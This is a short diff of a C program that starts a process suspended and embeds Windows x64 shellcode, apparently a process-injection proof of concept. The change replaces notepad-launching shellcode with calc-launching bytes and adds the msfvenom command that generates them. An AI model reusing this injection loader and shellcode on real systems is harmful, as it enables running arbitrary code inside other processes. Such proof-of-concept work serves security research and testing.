@@ -72,7 +72,8 @@ int main(int argc, char *argv[])
     // Call CreateSuspendedProcess function with the provided process name
     BOOL result = CreateSuspendedProcess(argv[1], &dwProcessId, &hProcess, &hThread);
 
-    // Shellcode that pops notepad.exe
+    // Shellcode that pops calc.exe
+    // msfvenom -p windows/x64/exec CMD=calc.exe -f c
     unsigned char buf[] =
         "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
         "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
@@ -93,7 +94,7 @@ int main(int argc, char *argv[])
         "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
         "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
         "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
-        "\xd5\x6e\x6f\x74\x65\x70\x61\x64\x2e\x65\x78\x65\x00";
+        "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
     SIZE_T shellSize = sizeof(buf);
 
     if (result)
